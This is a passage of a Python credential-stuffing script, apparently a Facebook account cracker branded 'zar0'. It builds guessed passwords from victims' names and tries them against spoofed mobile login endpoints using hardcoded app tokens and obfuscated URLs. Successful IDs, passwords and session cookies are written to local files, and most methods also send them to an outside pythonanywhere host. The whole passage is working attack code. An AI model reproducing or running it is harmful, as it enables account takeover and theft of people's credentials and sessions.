                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://b-gr"+"aph.face"+"book.com/auth/login?incl"+"ude_head"+"ers=false&d"+"ecode_body_json=false&stre"+"amable_json_resp"+"onse=true"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://a'+'pi.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
             #   print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                oks.append(ids)
                requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={ids}|{pas}|{cookie}")
                open('/sdcard/zar0-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M3-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDFOUR__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M4{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls4()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62'
            ]
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
        #        print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                oks.append(ids)
                requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={ids}|{pas}|{cookie}")
                open('/sdcard/zar0-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M4-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDFIVE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls5()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{secure_family_device_id}",
                "advertiser_id": f"{advertiser_id}",
                "format": "json",
                "cpl": "true",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": ids,
                "password": pas,
                "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",     
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig": "cc331688c9ec07059af4df9dbdcf7737"}
            headers = [
                "Host: graph.facebook.com",
                "Authorization: OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                f"X-FB-Net-HNI: {netheni}",
                f"X-FB-SIM-HNI: {simheni}",
                f"User-Agent: {user_agent.encode('utf-8')}",
                "X-FB-Client-IP: True",
                "X-FB-Request-Analytics-Tags: graphservice",
                "X-Tigon-Is-Retry: False",
                "X-FB-HTTP-Engine: Liger",
                "X-FB-Connection-Quality: MOBILE.LTE",
                "X-FB-Server-Cluster: True",
                "Connection: keep-alive",
                "x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62",         
                "X-FB-Connection-Bandwidth: 80025933",
                "X-FB-Friendly-Name: ViewerReactionsMutation",
                "Accept-Encoding: gzip, deflate",
                "X-FB-Connection-Type: MOBILE.LTE",
                "Content-Type: application/x-www-form-urlencoded",
            ]
            url = "https://b-gr"+"aph.face"+"book.com/auth/login?incl"+"ude_head"+"ers=false&d"+"ecode_body_json=false&stre"+"amable_json_resp"+"onse=true"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-gr'+'aph.face'+'book.com/aut'+'h/login?include_h'+'eaders=false&de'+'code_body_json=false&str'+'eamable_json_resp'+'onse=true')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
              #  print(f"\r\r{rad}[{green}COOKIES=[??]{rad}]: {warna}{cookie}")
                oks.append(ids)
                requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={ids}|{pas}|{cookie}")
                open('/sdcard/zar0-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M5-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

def __MTDSIX__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            warna = random.choice(my_color)
            session = requests.Session()
            free_fb = session.get('https://touch.facebook.com').text
            data =  {
    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
   "try_number":"0",
   "unrecognized_tries":"0",
   "email":ids,
   "pass":pas,
   "login":"Log In"}
            headers ={'authority':'m.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,headers=headers).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = kuki[65:80]
                print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}: {green}{pas}')
            #    print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                oks.append(cid)
                open('/sdcard/ZERO-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                break
            elif "checkpoint" in log_cookies:
                cps.append(ids)
                print(f'\r\r{rad}[ZERO-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/ZERO-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(50)
    except Exception as e:
        pass


os.system("clear")
#Process()
zar0()  
    
